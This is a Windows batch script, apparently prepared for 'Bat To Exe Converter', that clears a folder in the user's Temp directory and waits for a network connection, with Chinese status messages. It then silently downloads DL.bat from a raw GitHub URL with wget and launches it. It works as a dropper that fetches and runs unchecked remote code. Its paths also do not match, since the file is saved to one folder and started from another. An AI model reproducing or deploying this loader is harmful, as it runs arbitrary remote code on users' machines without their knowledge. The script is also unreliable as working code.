::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJF2L40w8JxpQcACRLSWzBbp8
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJF2L40w8JxpQcIJ07O5h3DPqD2wgOW9De3GYvDW5rW5SPVvAJfgWig==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cd /d "%USERPROFILE%\AppData\Local\Temp" 
rd /s /q  %USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7}
cls
:Start
ping www.baidu.com>nul&&goto download||echo 正在等待网络连接。。。。&for /l %%a in (3,-1,0) do ping -n 2 127.1>nul&cls&goto Start
:download
@echo 正在连接资源
wget -q -c -t 0 -P %USERPROFILE%\AppData\Local\Temp\one https://raw.githubusercontent.com/wgbingo/download/master/DL.bat
cd /d "%USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7}" 
@if %errorlevel%==0 ( 
start "" "%USERPROFILE%\AppData\Local\Temp\{FDA9A804-680F-48B2-941B-93434F43FFA7}\DL.bat"
) else (
cls&goto Start
)
::pause

